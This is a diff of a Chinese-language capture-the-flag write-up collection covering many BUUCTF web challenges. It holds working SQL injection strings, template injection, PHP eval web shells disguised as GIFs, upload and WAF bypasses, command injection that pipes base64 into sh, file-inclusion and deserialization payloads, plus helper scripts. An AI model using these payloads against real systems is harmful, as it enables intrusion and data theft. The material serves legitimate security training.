@@ -8189,71 +8189,71 @@
   <h1>BUU WEB（一）</h1>
 
 <h2 id="buu-web">BUU-WEB（一）</h2>
-<p>本来一题一篇文章，结果发现太浪费了，所以整合起来了，
- </p>
+<p>本来一题一篇文章，结果发现太浪费了，所以整合起来了，<br />
+</p>
 <h2 id="_1">随便注</h2>
-<p>随便输入一个单引号，报错
-<img alt="1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4-101639.png" />
- 
-order by 3就不行了
-<img alt="1582190298100-06781bef-d530-4026-bac8-bcd656294898.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298100-06781bef-d530-4026-bac8-bcd656294898-077707.png" />
- 
-尝试联合查询的时候出现提示：
-"/select|update|delete|drop|insert|where|./i"
-<img alt="1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f-133192.png" />
- 
-一个正则可视化网站：https://regexper.com
-<img alt="1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b-773787.png" />
- 
- 使用堆叠注入：1';show tables;#
-<img alt="1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58-966900.png" />
- 
-看一下表里有什么列名：1';show columns from <code>1919810931114514</code>;#
-（注意，字符串为表名的表操作时要加反引号）
-<img alt="1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894-532404.png" />
- 
-但是没办法使用 select * from <code>1919810931114514</code>
-看网上师傅们有两种方法，第一种：<strong>mysql 预定义语句</strong>
+<p>随便输入一个单引号，报错<br />
+<img alt="1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4-101639.png" /><br />
+<br />
+order by 3就不行了<br />
+<img alt="1582190298100-06781bef-d530-4026-bac8-bcd656294898.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298100-06781bef-d530-4026-bac8-bcd656294898-077707.png" /><br />
+<br />
+尝试联合查询的时候出现提示：<br />
+"/select|update|delete|drop|insert|where|./i"<br />
+<img alt="1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f-133192.png" /><br />
+<br />
+一个正则可视化网站：https://regexper.com<br />
+<img alt="1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b-773787.png" /><br />
+<br />
+ 使用堆叠注入：1';show tables;#<br />
+<img alt="1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58-966900.png" /><br />
+<br />
+看一下表里有什么列名：1';show columns from <code>1919810931114514</code>;#<br />
+（注意，字符串为表名的表操作时要加反引号）<br />
+<img alt="1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894-532404.png" /><br />
+<br />
+但是没办法使用 select * from <code>1919810931114514</code><br />
+看网上师傅们有两种方法，第一种：<strong>mysql 预定义语句</strong><br />
 <strong>1</strong>';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare execsql from @a;execute execsql;#</p>
-<p>hex decode 以后是：?inject=1';SeT@a=select * from <code>**1919810931114514**</code>;Prepare execsql from @a;execute execsql;#
- 
-<img alt="1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead-347395.png" />
- 
-还有一种方法时是：<strong>改表名 </strong>这样查询的时候就可以查询到 flag
-?inject=<strong>1</strong>';
-rename tables <code>words</code> to <code>test</code>;rename tables <code>1919810931114514</code> to <code>words</code>;
-alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#
- 
-意思分别是：把 words 表改名为 test，把 1919810931114541 改名为 words
-把列名 flag 改为 id
- 
-这样在 1'; or 1=1# 查询的时候就会把所有的都列出来，这样就可以看到 flag 了
-<img alt="1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6-300625.png" />
- </p>
+<p>hex decode 以后是：?inject=1';SeT@a=select * from <code>**1919810931114514**</code>;Prepare execsql from @a;execute execsql;#<br />
+<br />
+<img alt="1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead-347395.png" /><br />
+<br />
+还有一种方法时是：<strong>改表名 </strong>这样查询的时候就可以查询到 flag<br />
+?inject=<strong>1</strong>';<br />
+rename tables <code>words</code> to <code>test</code>;rename tables <code>1919810931114514</code> to <code>words</code>;<br />
+alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#<br />
+<br />
+意思分别是：把 words 表改名为 test，把 1919810931114541 改名为 words<br />
+把列名 flag 改为 id<br />
+<br />
+这样在 1'; or 1=1# 查询的时候就会把所有的都列出来，这样就可以看到 flag 了<br />
+<img alt="1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6-300625.png" /><br />
+</p>
 <h2 id="easy_tornado">easy_tornado</h2>
-<p>打开看到有三个文件：
-<img alt="1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be-630446.png" />
- 
-三个文件内容如下：
-<img alt="1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530-304926.png" />
-<img alt="1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a-717220.png" />
-<img alt="1582190298110-183b7d1b-bf44-45fb-8342-24311468d632.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298110-183b7d1b-bf44-45fb-8342-24311468d632-446671.png" />
- 
+<p>打开看到有三个文件：<br />
+<img alt="1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be-630446.png" /><br />
+<br />
+三个文件内容如下：<br />
+<img alt="1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530-304926.png" /><br />
+<img alt="1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a-717220.png" /><br />
+<img alt="1582190298110-183b7d1b-bf44-45fb-8342-24311468d632.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298110-183b7d1b-bf44-45fb-8342-24311468d632-446671.png" /><br />
+<br />
 通过 url 知道，访问一个文件需要知道：filename 跟 filehash</p>
-<p><img alt="1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d-368136.png" />
- 
+<p><img alt="1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d-368136.png" /><br />
+<br />
 企图直接访问是不行的，想到了 burp 抓包，但是抓了半天没抓到，看了网上的 wp 是 <strong>模版注入</strong></p>
-<p><img alt="1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9-656585.png" />
- 
-tornado 是一个 python 的模板，welcome.txt 中的 render 是 python 中的一个渲染函数，
+<p><img alt="1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9-656585.png" /><br />
+<br />
+tornado 是一个 python 的模板，welcome.txt 中的 render 是 python 中的一个渲染函数，<br />
 报错时候的 url 是这样的</p>
-<p><img alt="1582190298103-d507818f-47f7-40db-9971-d155a481cfa3.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298103-d507818f-47f7-40db-9971-d155a481cfa3-353906.png" />
- 
+<p><img alt="1582190298103-d507818f-47f7-40db-9971-d155a481cfa3.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298103-d507818f-47f7-40db-9971-d155a481cfa3-353906.png" /><br />
+<br />
 尝试把后面换成这样输出了！</p>
 <pre><code class="language-python">{ {111} }
 </code></pre>
-<p><img alt="1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87-802495.png" />
- 
+<p><img alt="1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87-802495.png" /><br />
+<br />
 在 tornado 模板中，存在一些可以访问的快速对象，例如：</p>
 <pre><code class="language-html">&lt;title&gt;
      { { escape(handler.settings[&quot;cookie&quot;]) } }
@@ -8262,8 +8262,8 @@ tornado 是一个 python 的模板，welcome.txt 中的 render 是 python �
 <p>那么输入：</p>
 <pre><code class="language-python">{ {handler.settings} }
 </code></pre>
-<p><img alt="1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081-570277.png" />
- 
+<p><img alt="1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081-570277.png" /><br />
+<br />
 拿到 cookie 就 OK 了！</p>
 <pre><code class="language-python">import hashlib
 def md5value(s):
@@ -8278,26 +8278,26 @@ def jiami():
     y=cookie_s+xprint(md5value(y.encode('utf-8')))
 jiami()
 </code></pre>
-<p><img alt="1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad-410477.png" />
- </p>
+<p><img alt="1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad-410477.png" /><br />
+</p>
 <h2 id="easysql">EasySQL</h2>
-<p>这道题目有两种解法，一种是：<em><strong>,1</strong>，这样查询结果会把表中所有的数据返回来（据说是非预期解，出题人可能忘记过滤掉</em>了）
-还有一种说是考察sql_mode，通过堆叠注入修改sql_mode，
-可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT 来实现将 <code>||</code> 视为字符串连接符而非 或 运算符 
-因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag 
- 
-Payload : 
-1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
-拼接后就变成了
-SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag
- </p>
+<p>这道题目有两种解法，一种是：<em><strong>,1</strong>，这样查询结果会把表中所有的数据返回来（据说是非预期解，出题人可能忘记过滤掉</em>了）<br />
+还有一种说是考察sql_mode，通过堆叠注入修改sql_mode，<br />
+可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT 来实现将 <code>||</code> 视为字符串连接符而非 或 运算符 <br />
+因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag <br />
+<br />
+Payload : <br />
+1;set sql_mode=PIPES_AS_CONCAT;SELECT 1<br />
+拼接后就变成了<br />
+SELECT 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1 || flag FROM Flag<br />
+</p>
 <h2 id="_2">高明的黑客</h2>
 <p>访问提示源码在 www.tar.gz</p>
-<p><img alt="1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f-752202.png" />
- 
+<p><img alt="1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f-752202.png" /><br />
+<br />
 在网址后面加上 www.tar.gz 是可以下载下来的</p>
-<p><img alt="1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9-492333.png" />
- 
+<p><img alt="1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9-492333.png" /><br />
+<br />
 下下来里面超级多 php 文件，用大佬的 python 脚本筛选出来</p>
 <pre><code class="language-python">import os,re
 import requests
@@ -8328,59 +8328,59 @@ for name in filenames:
                     print('POST:  ' + passwd)
         except : pass
 </code></pre>
-<p>我参考的网上的 wp 直接把 x 开头之前的 php 文件删掉了，不然要跑很长时间（php 版本要用 7 以上的）
-<img alt="1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f-139785.png" />
- 
-访问 xk0SzyKwfzw.php?Efa5BVG= cat /flag 得到 flag
-<img alt="1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec-206792.png" />
- </p>
+<p>我参考的网上的 wp 直接把 x 开头之前的 php 文件删掉了，不然要跑很长时间（php 版本要用 7 以上的）<br />
+<img alt="1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f-139785.png" /><br />
+<br />
+访问 xk0SzyKwfzw.php?Efa5BVG= cat /flag 得到 flag<br />
+<img alt="1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec-206792.png" /><br />
+</p>
 <h2 id="admin">admin</h2>
-<p>网上的 wp 有三个方法，这里只记录一个，Unicode 欺骗
-https://www.anquanke.com/post/id/164086
- 
-注册用户：ᴬdmin 
-会将其变成：Admin
-修改密码的时候会变成：admin
-这样就可以直接访问 admin 用户
- </p>
+<p>网上的 wp 有三个方法，这里只记录一个，Unicode 欺骗<br />
+https://www.anquanke.com/post/id/164086<br />
+<br />
+注册用户：ᴬdmin <br />
+会将其变成：Admin<br />
+修改密码的时候会变成：admin<br />
+这样就可以直接访问 admin 用户<br />
+</p>
 <h2 id="checkin">checkin</h2>
-<p>拿到题目，是一个上传界面
-<img alt="1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4-242583.png" />
- 
-尝试上传，php 显示非法后缀，传图马显示内容里面有 &lt;?
+<p>拿到题目，是一个上传界面<br />
+<img alt="1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4-242583.png" /><br />
+<br />
+尝试上传，php 显示非法后缀，传图马显示内容里面有 &lt;?<br />
 尝试这样的：</p>
 <blockquote>
-<p>GIF89a
+<p>GIF89a<br />
 <script language="php">eval ($_POST['yichen']);</script></p>
 </blockquote>
-<p><img alt="1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93-915194.png" />
- 
-成功上传，同时还显示了文件夹下的内容 
-<img alt="1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4-188082.png" />
- 
-想上传 .htaccess 把图片马解析成为 php 但是失败了
-看 wp 以后学到了 .user.ini 来上传后门
-了解一下，先从 php.ini 说起 php.ini 是 php 的默认配置文件，其中包括了很多 php 的配置
-其中 PHP_INI_USER 的配置项，可以在 ini_set () 函数中设置、注册表中设置，再就是.user.ini 中设置可以理解为 php 是允许用户自定义的 php.ini
-实际上，除了 <code>PHP_INI_SYSTEM</code> 以外的模式（包括 PHP_INI_ALL）都是可以通过.user.ini 来设置的
-而且 php.ini 是种动态加载的 ini 文件，不需要重启服务，只需要等待<code>user_ini.cache_ttl</code> 所设置的时间（默认300秒）就可以
-需要看的是这两个选项，它们的作用是指定一个文件，会自动把这个文件包含在其他要执行的文件里面，相当于 require()
-<img alt="1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40-327208.png" />
- 
-使用方法很简单，只需要在 .user.ini 文件中写：
-auto_prepend_file=文件名（比如：yichen.jpg）
- 
+<p><img alt="1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93-915194.png" /><br />
+<br />
+成功上传，同时还显示了文件夹下的内容 <br />
+<img alt="1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4-188082.png" /><br />
+<br />
+想上传 .htaccess 把图片马解析成为 php 但是失败了<br />
+看 wp 以后学到了 .user.ini 来上传后门<br />
+了解一下，先从 php.ini 说起 php.ini 是 php 的默认配置文件，其中包括了很多 php 的配置<br />
+其中 PHP_INI_USER 的配置项，可以在 ini_set () 函数中设置、注册表中设置，再就是.user.ini 中设置可以理解为 php 是允许用户自定义的 php.ini<br />
+实际上，除了 <code>PHP_INI_SYSTEM</code> 以外的模式（包括 PHP_INI_ALL）都是可以通过.user.ini 来设置的<br />
+而且 php.ini 是种动态加载的 ini 文件，不需要重启服务，只需要等待<code>user_ini.cache_ttl</code> 所设置的时间（默认300秒）就可以<br />
+需要看的是这两个选项，它们的作用是指定一个文件，会自动把这个文件包含在其他要执行的文件里面，相当于 require()<br />
+<img alt="1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40-327208.png" /><br />
+<br />
+使用方法很简单，只需要在 .user.ini 文件中写：<br />
+auto_prepend_file=文件名（比如：yichen.jpg）<br />
+<br />
 解题：先上传一个 .user.ini 文件</p>
-<p><img alt="1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae-028917.png" />
- 
+<p><img alt="1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae-028917.png" /><br />
+<br />
 在上传一个 yichen.jpg 文件</p>
-<p><img alt="1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1-070399.png" />
- 
-然后在访问同一文件夹下的 index.php 就可以得到 flag 了
- </p>
+<p><img alt="1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1-070399.png" /><br />
+<br />
+然后在访问同一文件夹下的 index.php 就可以得到 flag 了<br />
+</p>
 <h2 id="hack-world">Hack World</h2>
-<p>sql注入题目，通过基于时间的盲注可以测出来，但是不会写脚本，懒得一个一个测，看了师傅们的wp
- 师傅们用了 异或 这种操作，长见识了，师傅们的 WP：
+<p>sql注入题目，通过基于时间的盲注可以测出来，但是不会写脚本，懒得一个一个测，看了师傅们的wp<br />
+ 师傅们用了 异或 这种操作，长见识了，师傅们的 WP：<br />
 （意识到应该整理一些 sqli 的 FUZZ 字典</p>
 <pre><code class="language-python">import requests
 from lxml import etree
@@ -8410,17 +8410,17 @@ if __name__ == '__main__':
        a()
 </code></pre>
 <h2 id="easy-cacl">Easy Cacl</h2>
-<p>** PHP 字符串解析特性**：
- 当 php 查询字符串进行解析的时候会将某些字符删除或用下划线代替
+<p>** PHP 字符串解析特性**：<br />
+ 当 php 查询字符串进行解析的时候会将某些字符删除或用下划线代替<br />
 参考：https://www.freebuf.com/articles/web/213359.html</p>
-<p><img alt="1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465-089148.png" />
- 
-在 freebuf 的文章中，发现了上面这些是可以被用来替换的
-用到这道题目上来， WAF 的存在使得没法给 num 传字符，但是如果在 num 前面加上个空格，那样 WAF 在检测的时候就不会检测到 num 这个参数，但是 PHP在解析的时候会把空格删掉，这样就可以命令执行了，同时 calc.php 中还有个黑名单，可以使用 chr() 来绕过
-查看目录
-calc.php? num=1;var_dump(scandir(chr(47)))
-查看 flag
-calc.php? num=1;var_dump(readfile(chr(47).f1agg))
+<p><img alt="1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465.png" src="../img/551828_zv1qyrrwm6gucsq0/1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465-089148.png" /><br />
+<br />
+在 freebuf 的文章中，发现了上面这些是可以被用来替换的<br />
+用到这道题目上来， WAF 的存在使得没法给 num 传字符，但是如果在 num 前面加上个空格，那样 WAF 在检测的时候就不会检测到 num 这个参数，但是 PHP在解析的时候会把空格删掉，这样就可以命令执行了，同时 calc.php 中还有个黑名单，可以使用 chr() 来绕过<br />
+查看目录<br />
+calc.php? num=1;var_dump(scandir(chr(47)))<br />
+查看 flag<br />
+calc.php? num=1;var_dump(readfile(chr(47).f1agg))<br />
 不太明白为啥直接f1agg不行</p>
 <h2 id="2019lovesql">[极客大挑战 2019]LoveSQL</h2>
 <pre><code>admin' order by 4# 显示 Unknown column '4' in 'order clause'
@@ -8435,18 +8435,18 @@ admin1' union select 1,group_concat(column_name),3 from information_schema.colum
 admin1' union select 1,group_concat(id,username,password),3 from l0ve1ysq1#
 </code></pre>
 <h2 id="actf2020-include">[ACTF2020 新生赛]Include</h2>
-<p>伪协议文件包含
+<p>伪协议文件包含<br />
 ?file=php://filter/convert.base64-encode/resource=flag.php</p>
 <h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h2>
 <p>访问之后只有个 ?ip=，尝试 127.0.0.1;ls 出来结果，然后去 cat 的时候禁用了空格，用 $IFS$6 替代（数字随意），但是 flag 也被过滤了</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1599439530112-38110668-82aa-44e5-a7ad-fcf4173058d1-272125.png" /></p>
-<p>可以直接 cat$IFS$6<code>ls</code>
+<p>可以直接 cat$IFS$6<code>ls</code><br />
 也可以 echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</p>
 <h2 id="actf2020-exec">[ACTF2020 新生赛]Exec</h2>
-<p>post 传参
+<p>post 传参<br />
 target=;cat  ../../../flag</p>
 <h2 id="2019http">[极客大挑战 2019]Http</h2>
-<p>访问页面有个  Secret.php
+<p>访问页面有个  Secret.php<br />
 根据提示最后这样</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1599441456096-099530c3-e706-4d9d-9d47-9f5d0069078d-206486.png" /></p>
 <h2 id="2019babysql">[极客大挑战 2019]BabySQL</h2>
@@ -8459,7 +8459,7 @@ ad1min'uniunionon seselectlect 1,group_concat(column_name),3 frfromom infoorrmat
 admin1'uniunionon seselectlect 1,group_concat(id,username,passwoorrd),3 frfromom b4bsql#
 </code></pre>
 <h2 id="2019upload">[极客大挑战 2019]Upload</h2>
-<p>上传 phtml 的马，内容是
+<p>上传 phtml 的马，内容是<br />
 注意改一下 Content-Type: image/jpeg</p>
 <pre><code class="language-php">GIF89a
 &lt;script language=&quot;php&quot;&gt;eval ($_POST['yichen']);&lt;/script&gt;
@@ -8499,38 +8499,38 @@ else{
 }
 ?&gt; 
 </code></pre>
-<p>?text=php://input&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+<p>?text=php://input&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}<br />
 post 传参 welcome to the zjctf</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1599459160439-55f026c7-c2b2-42c2-a289-f73a56a6c555-726769.png" /></p>
 <h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2>
 <p>访问重定向得到 hint</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1599460088458-01e567c9-3e95-4a28-8161-93c05a2f6bfa-839685.png" /></p>
-<p>提交：ffifdyop
+<p>提交：ffifdyop<br />
 然后一个 MD5 弱类型、一个 MD5 强碰撞</p>
 <h2 id="2018fakebook">[网鼎杯 2018]Fakebook</h2>
 <p>通过个人界面的 sql注入查询得到的数据可以看到是经过序列化后的</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1600066589109-78520007-e35a-44ce-9f7e-16cd2028e7e8-451052.png" /></p>
 <p>下面有个 the contents of his/her blog，因为在</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1600066859906-6432a015-8c1d-438f-9f3d-8a98fceb8901-670260.png" /></p>
-<p><code>-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from users--+</code>
+<p><code>-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from users--+</code><br />
 在源代码中得到 base64，解码得到 flag</p>
 <p><img alt="image.png" src="../img/551828_zv1qyrrwm6gucsq0/1600067327093-48e5311e-0218-4078-9a16-bd150d040658-582040.png" /></p>
 <h2 id="2019hardsql">[极客大挑战 2019]HardSQL</h2>
-<p>爆库：geek
-<code>1'^extractvalue(1,concat(0x7e,(select(database()))))%23</code>
-爆表：H4rDsq1
-<code>1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))%23</code>
-爆字段：id,username,password
-<code>1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))%23</code>
-爆数据
-<code>1'^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code>
+<p>爆库：geek<br />
+<code>1'^extractvalue(1,concat(0x7e,(select(database()))))%23</code><br />
+爆表：H4rDsq1<br />
+<code>1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))%23</code><br />
+爆字段：id,username,password<br />
+<code>1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))%23</code><br />
+爆数据<br />
+<code>1'^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code><br />
 <code>1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</code></p>
 <h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli</h2>
-<p>在注释中有提示：<code>select * from user where username = '$name'</code>
-username：1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#
+<p>在注释中有提示：<code>select * from user where username = '$name'</code><br />
+username：1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#<br />
 password：123</p>
 <h2 id="2020-areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h2>
-<p>因为是 protect 的，所以有 00 字符，但是这样会有过滤，然而是弱类型所以直接数字绕过
